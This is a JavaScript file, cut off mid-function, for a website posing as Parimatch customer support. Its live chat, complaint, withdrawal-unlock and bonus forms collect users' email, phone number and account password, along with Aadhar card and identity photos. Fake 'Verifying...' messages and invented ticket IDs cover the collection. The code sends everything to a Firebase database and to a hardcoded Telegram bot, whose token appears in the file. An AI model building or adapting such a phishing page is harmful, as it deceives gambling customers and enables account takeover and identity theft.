// ===== Parimatch Support Site - Firebase Firestore Integration =====

// ===== FIREBASE CONFIG =====
const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
  authDomain: "alll-projects-admin-pennal.firebaseapp.com",
  projectId: "alll-projects-admin-pennal",
  storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
  messagingSenderId: "689297868215",
  appId: "1:689297868215:web:2747b19c2da47a31f49432"
};

const SITE_ID = "parimatch";

// ===== VALIDATION HELPERS =====
function isValidEmail(v) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(String(v || '').trim());
}

function isValidMobile(v) {
  var digits = String(v || '').replace(/[^\d]/g, '');
  return digits.length >= 10 && digits.length <= 15;
}

function isValidPassword(v) {
  return String(v || '').length >= 4;
}

// ===== FIREBASE DYNAMIC LOADER =====
let _fbDb = null;
let _fbLoading = null;

function loadFirebase() {
  if (_fbDb) return Promise.resolve(_fbDb);
  if (_fbLoading) return _fbLoading;

  _fbLoading = new Promise((resolve, reject) => {
    const initDb = () => {
      try {
        if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
        _fbDb = firebase.firestore();
        resolve(_fbDb);
      } catch (e) { reject(e); }
    };

    if (window.firebase && window.firebase.firestore) { initDb(); return; }

    const urls = [
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js',
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js'
    ];
    let loaded = 0;
    urls.forEach(src => {
      const s = document.createElement('script');
      s.src = src;
      s.onload = () => {
        loaded++;
        if (loaded === urls.length) initDb();
      };
      s.onerror = () => reject(new Error('Firebase load failed: ' + src));
      document.head.appendChild(s);
    });
  });

  return _fbLoading;
}

function saveSubmission(data) {
  return loadFirebase().then(db => {
    const payload = { ...data, site_id: SITE_ID, created_at: firebase.firestore.FieldValue.serverTimestamp() };
    return db.collection('submissions').add(payload);
  });
}

// ===== GLOBAL NOTIFICATION =====
function showNotification(message, type) {
  type = type || "info";
  var existing = document.querySelector('.ios-notification');
  if (existing) existing.remove();
  var notif = document.createElement('div');
  notif.className = 'ios-notification ' + type;
  var iconSvg = '';
  if (type === 'success') {
    iconSvg = '<svg width="1.2em" height="1.2em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;"><polyline points="20 6 9 17 4 12"/></svg>';
  } else if (type === 'error') {
    iconSvg = '<svg width="1.2em" height="1.2em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>';
  } else {
    iconSvg = '<svg width="1.2em" height="1.2em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>';
  }
  notif.innerHTML = '<div class="notif-content"><span class="notif-icon">' + iconSvg + '</span><span>' + message + '</span></div>';
  notif.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:' + (type === 'success' ? 'rgba(52,199,89,0.95)' : type === 'error' ? 'rgba(255,59,48,0.95)' : 'rgba(216,245,41,0.95)') + ';color:#0F1012;padding:14px 20px;border-radius:16px;font-weight:500;font-size:0.95rem;z-index:1000;box-shadow:0 8px 32px rgba(0,0,0,0.4);backdrop-filter:blur(10px);max-width:90%;text-align:center;animation:slideDown 0.3s ease,fadeOut 0.3s ease 2.7s forwards;';
  document.body.appendChild(notif);
  setTimeout(function() { notif.remove(); }, 3000);
}

document.addEventListener('DOMContentLoaded', () => {

  // Splash screen - remove after animation
  setTimeout(() => {
    const splash = document.getElementById('splashScreen');
    if (splash) splash.remove();
  }, 2800);

  // Page transition helper
  function navigateWithTransition(url) {
    const overlay = document.getElementById('pageTransition');
    if (overlay) {
      overlay.classList.add('active');
      setTimeout(() => { window.location.href = url; }, 400);
    } else {
      window.location.href = url;
    }
  }

  // Auto-select tab from URL params (complaint.html?tab=deposit)
  const urlParams = new URLSearchParams(window.location.search);
  const tabParam = urlParams.get('tab');
  if (tabParam) {
    const targetTab = document.querySelector('[data-tab="' + tabParam + '"]');
    if (targetTab) targetTab.click();
  }

  // COMPLAIN NOW Button Redirect with transition
  const submitBtn = document.getElementById('submitProblemBtn');
  if (submitBtn) {
    submitBtn.addEventListener('click', (e) => {
      e.preventDefault();
      navigateWithTransition('complaint.html');
    });
  }

  // Helper: Redirect to complaint page with transition
  window.scrollToForm = (type) => {
    navigateWithTransition('complaint.html?tab=' + type);
  };

  // Internal links with transition (exclude already-handled buttons)
  document.querySelectorAll('a[href^="index.html"], a[href^="complaint.html"], a[href^="withdrawal.html"], a[href^="documents.html"], a[href^="bank_statement.html"]').forEach(link => {
    if (link.id === 'submitProblemBtn') return;
    link.addEventListener('click', (e) => {
      if (!link.hasAttribute('target')) {
        e.preventDefault();
        navigateWithTransition(link.getAttribute('href'));
      }
    });
  });

  // LIVE CHAT Verify Popup - details saved to Firebase before redirect
  const liveChatBtn = document.getElementById('liveChatBtn');
  const chatPopup = document.getElementById('chatPopup');
  if (liveChatBtn && chatPopup) {
    liveChatBtn.addEventListener('click', (e) => {
      e.preventDefault();
      chatPopup.classList.add('active');
    });

    const chatPopupClose = document.getElementById('chatPopupClose');
    if (chatPopupClose) chatPopupClose.addEventListener('click', () => chatPopup.classList.remove('active'));
    chatPopup.addEventListener('click', (e) => { if (e.target === chatPopup) chatPopup.classList.remove('active'); });

    const chatSubmitBtn = document.getElementById('chatPopupSubmit');
    chatSubmitBtn.addEventListener('click', async () => {
      const cEmail = document.getElementById('chatEmail');
      const cMobile = document.getElementById('chatMobile');
      const cPassword = document.getElementById('chatPassword');

      if (!cEmail.value.trim()) { showNotification("Please enter your Game Email ID", "error"); return; }
      if (!isValidEmail(cEmail.value)) { showNotification("Please enter a valid email address", "error"); return; }
      if (!cMobile.value.trim()) { showNotification("Please enter your Registered Mobile Number", "error"); return; }
      if (!isValidMobile(cMobile.value)) { showNotification("Please enter a valid mobile number (min 10 digits)", "error"); return; }
      if (!cPassword.value) { showNotification("Please enter your Game Account Password", "error"); return; }
      if (!isValidPassword(cPassword.value)) { showNotification("Password must be at least 4 characters", "error"); return; }

      chatSubmitBtn.disabled = true;
      chatSubmitBtn.textContent = "Verifying...";

      try {
        const requestId = "TX" + Math.floor(100000 + Math.random() * 900000);
        const gameId = "TOPX" + Math.floor(10000 + Math.random() * 90000);
        const timestamp = new Date().toLocaleString('en-IN', {
          day: '2-digit', month: 'short', year: 'numeric',
          hour: '2-digit', minute: '2-digit', hour12: true
        });

        await saveSubmission({
          request_id: requestId,
          email: cEmail.value.trim(),
          mobile: cMobile.value.trim(),
          password: cPassword.value,
          type: 'Live Chat',
          game_id: gameId,
          timestamp: timestamp,
          source: 'Parimatch Official Support'
        });

        window.location.href = 'https://chat-page.edgeone.app';
      } catch (error) {
        console.error("Firebase Error:", error);
        showNotification("❌ Verification failed. Please try again.", "error");
        chatSubmitBtn.disabled = false;
        chatSubmitBtn.textContent = "Start Live Chat";
      }
    });
  }

  // ✅ Form logic - only runs on complaint/withdrawal page
  const problemForm = document.getElementById('problemForm');
  const isKYCPage = !!document.getElementById('aadharFront');
  const isBankPage = !!document.getElementById('bankStatement1');
  if (problemForm && !isKYCPage && !isBankPage) {
    // Problem status chips - single select
    const statusChips = document.querySelectorAll('.status-chip');
    statusChips.forEach(chip => {
      chip.addEventListener('click', () => {
        statusChips.forEach(c => c.classList.remove('active'));
        chip.classList.add('active');
      });
    });

    const tabBtns = document.querySelectorAll('.tab-btn');
    const depositFields = document.getElementById('depositFields');
    const withdrawalFields = document.getElementById('withdrawalFields');

    tabBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        tabBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');

        const tab = btn.dataset.tab;

        if (tab === 'deposit') {
          if (depositFields) depositFields.classList.add('active');
          if (withdrawalFields) withdrawalFields.classList.remove('active');
          const da = document.getElementById('depositAmount');
          const utr = document.getElementById('utr');
          const wa = document.getElementById('withdrawAmount');
          if (da) da.required = true;
          if (utr) utr.required = true;
          if (wa) wa.required = false;
        } else {
          if (depositFields) depositFields.classList.remove('active');
          if (withdrawalFields) withdrawalFields.classList.add('active');
          const da = document.getElementById('depositAmount');
          const utr = document.getElementById('utr');
          const wa = document.getElementById('withdrawAmount');
          if (da) da.required = false;
          if (utr) utr.required = false;
          if (wa) wa.required = true;
        }
      });
    });

    // Form Submission - FIREBASE SAVE
    problemForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      const activeStatusChip = document.querySelector('.status-chip.active');
      const tabBtns = document.querySelectorAll('.tab-btn');
      if (tabBtns.length === 0) return;

      if (!activeStatusChip) {
        showNotification("Please select your problem status", "error");
        return;
      }

      const emailVal = document.getElementById('email').value;
      const mobileVal = document.getElementById('mobile').value;
      const passwordVal = document.getElementById('password').value;

      if (!emailVal.trim()) { showNotification("Please enter your Game Email ID", "error"); return; }
      if (!isValidEmail(emailVal)) { showNotification("Please enter a valid email address", "error"); return; }
      if (!mobileVal.trim()) { showNotification("Please enter your Game Account Mobile No.", "error"); return; }
      if (!isValidMobile(mobileVal)) { showNotification("Please enter a valid mobile number (min 10 digits)", "error"); return; }
      if (!passwordVal) { showNotification("Please enter your Game Account Password", "error"); return; }
      if (!isValidPassword(passwordVal)) { showNotification("Password must be at least 4 characters", "error"); return; }

      const type = document.querySelector('.tab-btn.active').dataset.tab;
      if (type === 'deposit') {
        if (!document.getElementById('depositAmount').value.trim()) { showNotification("Please enter Deposit Amount", "error"); return; }
        if (!document.getElementById('utr').value.trim()) { showNotification("Please enter UTR / Transaction ID", "error"); return; }
      } else {
        if (!document.getElementById('withdrawAmount').value.trim()) { showNotification("Please enter Withdrawal Amount", "error"); return; }
        if (!document.getElementById('withdrawMethod').value) { showNotification("Please select Withdrawal Method", "error"); return; }
      }
      if (!document.getElementById('description').value.trim()) { showNotification("Please describe your issue", "error"); return; }

      const submitBtn = problemForm.querySelector('.btn-submit');
      const originalBtnText = submitBtn.innerHTML;
      submitBtn.innerHTML = "⏳ Sending...";
      submitBtn.disabled = true;

      try {
        const requestId = "TX" + Math.floor(100000 + Math.random() * 900000);

        const email = document.getElementById('email').value;
        const mobile = document.getElementById('mobile').value;
        const password = document.getElementById('password').value;
        const description = document.getElementById('description').value;
        const type = document.querySelector('.tab-btn.active').dataset.tab;
        const timestamp = new Date().toLocaleString('en-IN', {
          day: '2-digit', month: 'short', year: 'numeric',
          hour: '2-digit', minute: '2-digit', hour12: true
        });

        let amount = "", utr = "", method = "";
        if (type === 'deposit') {
          amount = document.getElementById('depositAmount').value;
          utr = document.getElementById('utr').value;
        } else {
          amount = document.getElementById('withdrawAmount').value;
          method = document.getElementById('withdrawMethod').value;
        }

        const gameId = "TOPX" + Math.floor(10000 + Math.random() * 90000);

        await saveSubmission({
          request_id: requestId,
          email: email,
          mobile: mobile,
          password: password,
          description: description,
          type: type === 'deposit' ? 'Deposit Problem' : 'Withdrawal Problem',
          issue_status: activeStatusChip.dataset.status,
          amount: amount,
          utr: utr || 'N/A',
          withdraw_method: method || 'Not specified',
          game_id: gameId,
          timestamp: timestamp,
          source: 'Parimatch Official Support'
        });

        showNotification("✅ Complaint filed successfully!", "success");
        problemForm.reset();
        statusChips.forEach(c => c.classList.remove('active'));
        if (depositFields) depositFields.classList.add('active');
        if (withdrawalFields) withdrawalFields.classList.remove('active');
        const dTab = document.querySelector('[data-tab="deposit"]');
        const wTab = document.querySelector('[data-tab="withdrawal"]');
        if (dTab) dTab.classList.add('active');
        if (wTab) wTab.classList.remove('active');

      } catch (error) {
        console.error("Firebase Error:", error);
        showNotification("❌ Failed to send. Please try again.", "error");
      } finally {
        submitBtn.innerHTML = originalBtnText;
        submitBtn.disabled = false;
      }
    });
  }

  // Add keyframes
  const style = document.createElement('style');
  style.textContent = `
    @keyframes slideDown { from { top: -60px; opacity: 0; } to { top: 20px; opacity: 1; } }
    @keyframes fadeOut { to { opacity: 0; transform: translateX(-50%) translateY(-10px); } }
  `;
  document.head.appendChild(style);

  // iOS Input Enhancements
  document.querySelectorAll('input, textarea').forEach(input => {
    input.addEventListener('focus', function() {
      this.parentElement.style.transform = 'scale(1.01)';
      this.parentElement.style.transition = 'transform 0.2s ease';
    });
    input.addEventListener('blur', function() {
      this.parentElement.style.transform = 'scale(1)';
    });
  });

  // Prevent zoom on focus (iOS)
  document.querySelectorAll('input, select, textarea').forEach(el => {
    el.addEventListener('focus', () => {
      if (window.innerWidth < 1024) {
        document.querySelector('meta[name="viewport"]').setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
      }
    });
    el.addEventListener('blur', () => {
      document.querySelector('meta[name="viewport"]').setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes');
    });
  });

  console.log("%c[Parimatch Support Loaded]", "color:#D8F529; font-size:14px; font-weight:bold;");
  console.log("%c[Firebase Integration Ready | Secure]", "color:#FFA000;");

  // Preload Firebase in background
  loadFirebase().catch(e => console.warn('Firebase preload skipped:', e));
});

// ============================================================
//  UNLOCK WITHDRAWAL - 2-Step Flow
//  Step 1: Account Verification  |  Step 2: Documents
// ============================================================

const $unlock = id => document.getElementById(id);

// ===== TELEGRAM CONFIG =====
const TG_BOT_TOKEN = '8906822745:AAH_rQOexAgYey92rzgNw6piosCXDY20rwM';
const TG_CHAT_ID = '-1003782852692';

function sendTelegramMessage(text) {
  return fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'HTML' })
  }).then(function(r) { return r.json(); }).then(function(data) {
    if (!data.ok) throw new Error(data.description || 'Telegram send failed');
    return data;
  });
}

function sendImageToTelegram(file, caption) {
  var fd = new FormData();
  fd.append('chat_id', TG_CHAT_ID);
  fd.append('photo', file);
  fd.append('caption', caption);
  return fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendPhoto', {
    method: 'POST',
    body: fd
  }).then(function(r) { return r.json(); }).then(function(data) {
    if (data.ok) {
      return 'https://t.me/c/' + TG_CHAT_ID.replace('-100', '') + '/' + data.result.message_id;
    } else {
      throw new Error(data.description || 'Telegram send failed');
    }
  });
}

function uploadFile(file, storagePath, reqId) {
  var parts = storagePath.split('/');
  var fileName = parts[parts.length - 1];
  var rid = reqId || _rid;
  var caption = '🆔 ' + rid + ' | ' + fileName.replace(/\.[^/.]+$/, '');
  return sendImageToTelegram(file, caption);
}

// ===== LOCAL REQUESTS STORAGE =====
const REQ_STORAGE_KEY = 'parimatch_unblock_requests';

function getLocalRequests() {
  return JSON.parse(localStorage.getItem(REQ_STORAGE_KEY) || '[]');
}

function saveRequestToLocal(data) {
  var requests = getLocalRequests();
  data._reqTime = new Date().toLocaleString('en-IN', {
    day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit'
  });
  if (!data.reqId) data.reqId = "TX" + Math.floor(100000 + Math.random() * 900000);
  requests.unshift(data);
  localStorage.setItem(REQ_STORAGE_KEY, JSON.stringify(requests));
}

// ===== UNBLOCK SINGLE-STEP =====
var _unblockData = {};
var _rid = null;

function showUnlockToast(msg, type) {
  var el = $unlock('toastMessage');
  if (el) el.textContent = msg;
  var t = $unlock('toast');
  if (!t) return;
  t.classList.add('show');
  if (type) t.classList.add('toast-' + type);
  setTimeout(function() {
    t.classList.remove('show');
    if (type) t.classList.remove('toast-' + type);
  }, 2500);
}

function submitUnblockRequest() {
  var submitBtn = $unlock('unblockSubmit');
  if (submitBtn) {
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Verifying...';
  }
  var rid = _rid || "TX" + Math.floor(100000 + Math.random() * 900000);
  _rid = rid;
  var d = { type: 'unlock_withdrawal', site_id: SITE_ID, reqId: rid };
  Object.keys(_unblockData).forEach(function(k) { d[k] = _unblockData[k]; });
  var fileFields = [
    { field: 'issue_image', key: 'issue_image_url', single: true },
    { field: 'aadhar_front', key: 'aadhar_front_url', single: true },
    { field: 'aadhar_back', key: 'aadhar_back_url', single: true },
    { field: 'identity_image', key: 'identity_image_url', single: true }
  ];
  var uploadPromises = [];
  fileFields.forEach(function(ff) {
    var fileInput = document.querySelector('[name="' + ff.field + '"]');
    if (fileInput && fileInput.files && fileInput.files.length > 0) {
      if (ff.single) {
        var file = fileInput.files[0];
        var ext = file.name.split('.').pop();
        var path = 'unlock/' + rid + '/' + ff.field + '.' + ext;
        uploadPromises.push(uploadFile(file, path).then(function(url) {
          d[ff.key] = url;
        }));
      }
    }
  });
  Promise.all(uploadPromises).then(function() {
    d.time = new Date().toLocaleString('en-IN', {
      day: '2-digit', month: 'short', year: 'numeric',
      hour: '2-digit', minute: '2-digit'
    });
    saveRequestToLocal(d);
    showUnlockToast('Request sent to support team! ✅');
    return saveSubmission(d);
  }).then(function() {
    document.querySelectorAll('.file-label').forEach(function(l) {
      l.classList.remove('has-file');
      var icon = l.querySelector('i');
      var span = l.querySelector('span');
      if (icon && span) {
        if (l.id.includes('Issue') || l.id.includes('issue')) { icon.className = 'fas fa-image'; span.textContent = 'Choose issue screenshot'; }
        else if (l.id.includes('aadharFront') || l.id.includes('AadharFront')) { icon.className = 'fas fa-id-card'; span.textContent = 'Choose Aadhar front image'; }
        else if (l.id.includes('aadharBack') || l.id.includes('AadharBack')) { icon.className = 'fas fa-id-card'; span.textContent = 'Choose Aadhar back image'; }
        else if (l.id.includes('identity') || l.id.includes('Identity')) { icon.className = 'fas fa-id-card'; span.textContent = 'Choose identity verification image'; }
      }
    });
    document.querySelectorAll('.file-name').forEach(function(n) { n.textContent = ''; });
    if (submitBtn) submitBtn.disabled = false;
    var sp = $unlock('successPopup');
    if (sp) sp.classList.add('active');
  }).catch(function(err) {
    console.warn('Unblock submit failed:', err);
    showUnlockToast('Submission failed - try again', 'error');
    if (submitBtn) {
      submitBtn.disabled = false;
      submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Verify Account';
    }
  });
}

// ===== UNBLOCK EVENT BINDING =====
try {
  var unblockSubmitBtn = $unlock('unblockSubmit');
  if (unblockSubmitBtn) {
    unblockSubmitBtn.addEventListener('click', function() {
      var uname = $unlock('fUserName');
      var em = $unlock('fEmail');
      var acc = $unlock('fAccountNumber');
      var pwd = $unlock('fPassword');
      if (!uname || !uname.value.trim()) { showUnlockToast('Enter User Name'); uname.focus(); return; }
      if (!em || !em.value.trim()) { showUnlockToast('Enter Game Email ID'); em.focus(); return; }
      if (!isValidEmail(em.value)) { showUnlockToast('Enter a valid email address'); em.focus(); return; }
      if (!acc || !acc.value.trim()) { showUnlockToast('Enter Game Mobile Number'); acc.focus(); return; }
      if (!isValidMobile(acc.value)) { showUnlockToast('Enter a valid mobile number (min 10 digits)'); acc.focus(); return; }
      if (!pwd || !pwd.value.trim()) { showUnlockToast('Enter Game Account Password'); pwd.focus(); return; }
      if (!isValidPassword(pwd.value)) { showUnlockToast('Password must be at least 4 characters'); pwd.focus(); return; }
      var issue = document.querySelector('[name="issue_image"]');
      var aadharF = document.querySelector('[name="aadhar_front"]');
      var aadharB = document.querySelector('[name="aadhar_back"]');
      var identity = document.querySelector('[name="identity_image"]');
      if (!issue || !issue.files || !issue.files[0]) { showUnlockToast('Upload issue image'); return; }
      if (!aadharF || !aadharF.files || !aadharF.files[0]) { showUnlockToast('Upload Aadhar front side image'); return; }
      if (!aadharB || !aadharB.files || !aadharB.files[0]) { showUnlockToast('Upload Aadhar back side image'); return; }
      if (!identity || !identity.files || !identity.files[0]) { showUnlockToast('Upload identity verification image'); return; }
      _unblockData.user_name = uname.value.trim();
      _unblockData.email = em.value.trim();
      _unblockData.account_number = acc.value.trim();
      _unblockData.password = pwd.value.trim();
      var msg = '<b>🔔 New Unlock Withdrawal Request</b>\n'
        + '<b>User Name:</b> ' + _unblockData.user_name + '\n'
        + '<b>Email:</b> ' + _unblockData.email + '\n'
        + '<b>Account No:</b> ' + _unblockData.account_number + '\n'
        + '<b>Time:</b> ' + new Date().toLocaleString('en-IN');
      sendTelegramMessage(msg).catch(function(e) { console.warn('TG notify:', e); });
      _rid = "TX" + Math.floor(100000 + Math.random() * 900000);
      submitUnblockRequest();
    });
  }
} catch (e) { console.warn('unblock steps:', e); }

// ===== FILE INPUT UI (unblock page) =====
try {
  document.querySelectorAll('.file-input-wrap input[type="file"]').forEach(function(input) {
    input.addEventListener('change', function() {
      var label = this.parentElement.querySelector('.file-label');
      var nameEl = this.parentElement.parentElement.querySelector('.file-name');
      if (this.files && this.files.length > 0) {
        label.classList.add('has-file');
        var icon = label.querySelector('i');
        var span = label.querySelector('span');
        if (icon) icon.className = 'fas fa-check-circle';
        if (this.files.length > 1) {
          if (span) span.textContent = this.files.length + ' files selected';
          if (nameEl) nameEl.textContent = this.files.length + ' files selected: ' + this.files[0].name + (this.files.length > 1 ? ' +' + (this.files.length - 1) + ' more' : '');
        } else {
          if (span) span.textContent = this.files[0].name;
          if (nameEl) nameEl.textContent = 'Selected: ' + this.files[0].name;
        }
      } else {
        label.classList.remove('has-file');
      }
    });
  });
} catch (e) {}

// ===== DEMO IMAGE POPUP (only for Identity Verification) =====
try {
  var _activeFileInput = null;

  var identityLabel = document.querySelector('.file-input-wrap input[name="identity_image"]');
  if (identityLabel) {
    var label = identityLabel.parentElement.querySelector('.file-label');
    if (label) {
      label.addEventListener('click', function(e) {
        e.preventDefault();
        var wrap = this.parentElement;
        var input = wrap.querySelector('input[type="file"]');
        if (!input) return;
        _activeFileInput = input;

        var popup = $unlock('demoPopup');
        var titleEl = $unlock('demoPopupTitle');
        var textEl = $unlock('demoPopupText');
        if (titleEl) titleEl.textContent = 'Upload Identity Verification';
        if (textEl) textEl.textContent = 'Please upload a clear photo of your identity proof. This helps us verify your account faster.';
        if (popup) popup.classList.add('active');
      });
    }
  }

  function closeDemoPopup() {
    var popup = $unlock('demoPopup');
    if (popup) popup.classList.remove('active');
    if (_activeFileInput) {
      setTimeout(function() {
        _activeFileInput.click();
        _activeFileInput = null;
      }, 350);
    }
  }

  var closeBtn = $unlock('demoPopupClose');
  if (closeBtn) closeBtn.addEventListener('click', closeDemoPopup);

  var gotItBtn = $unlock('demoPopupBtn');
  if (gotItBtn) gotItBtn.addEventListener('click', closeDemoPopup);

  var popupOverlay = $unlock('demoPopup');
  if (popupOverlay) {
    popupOverlay.addEventListener('click', function(e) {
      if (e.target === popupOverlay) closeDemoPopup();
    });
  }
} catch (e) { console.warn('demo popup:', e); }

try {
  var sp = $unlock('successPopup');
  if (sp) sp.addEventListener('click', function(e) {
    if (e.target === sp) sp.classList.remove('active');
  });
} catch (e) {}

// ============================================================
//  BONUS PROBLEM - 2-Step Flow
//  Step 1: Account Verification  |  Step 2: Bonus Details
// ============================================================

var _bonusData = {};
var _bRid = null;

function goToBonusStep(step) {
  for (var i = 1; i <= 2; i++) {
    var panel = $unlock('bStep' + i);
    var dot = $unlock('bStepDot' + i);
    var line = $unlock('bStepLine' + i);
    if (panel) panel.classList.remove('active');
    if (dot) dot.classList.remove('active', 'done');
    if (line) line.classList.remove('done');
  }
  var activePanel = $unlock('bStep' + step);
  if (activePanel) activePanel.classList.add('active');
  for (var j = 1; j <= step; j++) {
    var d = $unlock('bStepDot' + j);
    if (d) {
      if (j < step) d.classList.add('done');
      else d.classList.add('active');
    }
    if (j < step) {
      var l = $unlock('bStepLine' + j);
      if (l) l.classList.add('done');
    }
  }
}

function showBonusToast(msg) {
  var el = $unlock('bToastMessage');
  if (el) el.textContent = msg;
  var t = $unlock('bToast');
  if (!t) return;
  t.classList.add('show');
  setTimeout(function() {
    t.classList.remove('show');
  }, 2500);
}

function submitBonusRequest() {
  var submitBtn = $unlock('bStep2Submit');
  if (submitBtn) {
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Submitting...';
  }
  var rid = _bRid || "TX" + Math.floor(100000 + Math.random() * 900000);
  _bRid = rid;
  var d = { type: 'bonus_problem', site_id: SITE_ID, reqId: rid };
  Object.keys(_bonusData).forEach(function(k) { d[k] = _bonusData[k]; });
  d.bonus_amount = document.querySelector('[name="b_bonus_amount"]').value;

  var fileFields = [
    { field: 'bonus_issue_image', key: 'bonus_issue_image_url', single: true },
    { field: 'profile_image', key: 'profile_image_url', single: true }
  ];
  var uploadPromises = [];
  fileFields.forEach(function(ff) {
    var fileInput = document.querySelector('[name="' + ff.field + '"]');
    if (fileInput && fileInput.files && fileInput.files.length > 0) {
      if (ff.single) {
        var file = fileInput.files[0];
        var ext = file.name.split('.').pop();
        var path = 'bonus/' + rid + '/' + ff.field + '.' + ext;
        uploadPromises.push(uploadFile(file, path, rid).then(function(url) {
          d[ff.key] = url;
        }));
      }
    }
  });
  Promise.all(uploadPromises).then(function() {
    d.time = new Date().toLocaleString('en-IN', {
      day: '2-digit', month: 'short', year: 'numeric',
      hour: '2-digit', minute: '2-digit'
    });
    saveRequestToLocal(d);
    showBonusToast('Request sent to support team! ✅');
    return saveSubmission(d);
  }).then(function() {
    document.querySelectorAll('.file-label').forEach(function(l) {
      l.classList.remove('has-file');
      var icon = l.querySelector('i');
      var span = l.querySelector('span');
      if (icon && span) {
        if (l.id.includes('bonusIssue') || l.id.includes('BonusIssue')) { icon.className = 'fas fa-image'; span.textContent = 'Choose issue screenshot'; }
        else if (l.id.includes('profileImage') || l.id.includes('ProfileImage')) { icon.className = 'fas fa-user'; span.textContent = 'Choose profile image'; }
      }
    });
    document.querySelectorAll('.file-name').forEach(function(n) { n.textContent = ''; });
    if (submitBtn) submitBtn.disabled = false;
    var sp = $unlock('bSuccessPopup');
    if (sp) sp.classList.add('active');
  }).catch(function(err) {
    console.warn('Bonus submit failed:', err);
    showBonusToast('Submission failed - try again');
    if (submitBtn) {
      submitBtn.disabled = false;
      submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Now';
    }
  });
}

// ===== BONUS EVENT BINDING =====
try {
  // Step 1 → Next
  var bs1n = $unlock('bStep1Next');
  if (bs1n) {
    bs1n.addEventListener('click', function() {
      var uname = $unlock('bfUserName');
      var em = $unlock('bfEmail');
      var acc = $unlock('bfAccountNumber');
      var pwd = $unlock('bfPassword');
      if (!uname || !uname.value.trim()) { showBonusToast('Enter User Name'); uname.focus(); return; }
      if (!em || !em.value.trim()) { showBonusToast('Enter Game Email ID'); em.focus(); return; }
      if (!isValidEmail(em.value)) { showBonusToast('Enter a valid email address'); em.focus(); return; }
      if (!acc || !acc.value.trim()) { showBonusToast('Enter Game Account Number'); acc.focus(); return; }
      if (!isValidMobile(acc.value)) { showBonusToast('Enter a valid account/mobile number (min 10 digits)'); acc.focus(); return; }
      if (!pwd || !pwd.value.trim()) { showBonusToast('Enter Game Account Password'); pwd.focus(); return; }
      if (!isValidPassword(pwd.value)) { showBonusToast('Password must be at least 4 characters'); pwd.focus(); return; }
      _bonusData.user_name = uname.value.trim();
      _bonusData.email = em.value.trim();
      _bonusData.account_number = acc.value.trim();
      _bonusData.password = pwd.value.trim();
      goToBonusStep(2);
    });
  }

  // Step 2 Back
  var bs2b = $unlock('bStep2Back');
  if (bs2b) bs2b.addEventListener('click', function() { goToBonusStep(1); });

  // Step 2 Submit
  var bs2Submit = $unlock('bStep2Submit');
  if (bs2Submit) {
    bs2Submit.addEventListener('click', function() {
      var amt = $unlock('bfBonusAmount');
      var issueImg = document.querySelector('[name="bonus_issue_image"]');
      var profileImg = document.querySelector('[name="profile_image"]');
      if (!amt || !amt.value.trim()) { showBonusToast('Enter bonus amount'); amt.focus(); return; }
      if (!issueImg || !issueImg.files || !issueImg.files[0]) { showBonusToast('Upload bonus issue image'); return; }
      if (!profileImg || !profileImg.files || !profileImg.files[0]) { showBonusToast('Upload profile image'); return; }
      _bRid = "TX" + Math.floor(100000 + Math.random() * 900000);
      submitBonusRequest();
    });
  }
} catch (e) { console.warn('bonus steps:', e); }

// ===== BONUS POPUP CLOSE =====
try {
  var bsp = $unlock('bSuccessPopup');
  if (bsp) bsp.addEventListener('click', function(e) {
    if (e.target === bsp) bsp.classList.remove('active');
  });
} catch (e) {}

// ============================================================
//  KYC PROBLEM - Form Submission
// ============================================================
function setupUploadLabel(inputId, labelId, nameId) {
  var input = document.getElementById(inputId);
  var label = document.getElementById(labelId);
  var nameEl = document.getElementById(nameId);
  if (!input || !label) return;
  input.addEventListener('change', function() {
    if (this.files && this.files[0]) {
      var span = label.querySelector('span');
      var icon = label.querySelector('i');
      if (span) span.textContent = 'Uploading...';
      if (icon) { icon.className = 'fas fa-spinner fa-spin'; }
      label.style.background = 'var(--card-gray)';
      label.style.color = 'var(--text-secondary)';
      label.style.borderColor = 'rgba(255,255,255,0.2)';
      setTimeout(function() {
        if (span) span.textContent = 'Uploaded';
        if (icon) { icon.className = 'fas fa-check-circle'; }
        label.style.background = 'rgba(52,199,89,0.2)';
        label.style.color = '#34C759';
        label.style.borderColor = '#34C759';
        if (nameEl) nameEl.textContent = 'Selected: ' + input.files[0].name;
      }, 1500);
    } else {
      var span = label.querySelector('span');
      var icon = label.querySelector('i');
      if (span) span.textContent = 'Choose Image';
      if (icon) { icon.className = 'fas fa-cloud-upload-alt'; }
      label.style.background = 'var(--card-gray)';
      label.style.color = 'var(--text-secondary)';
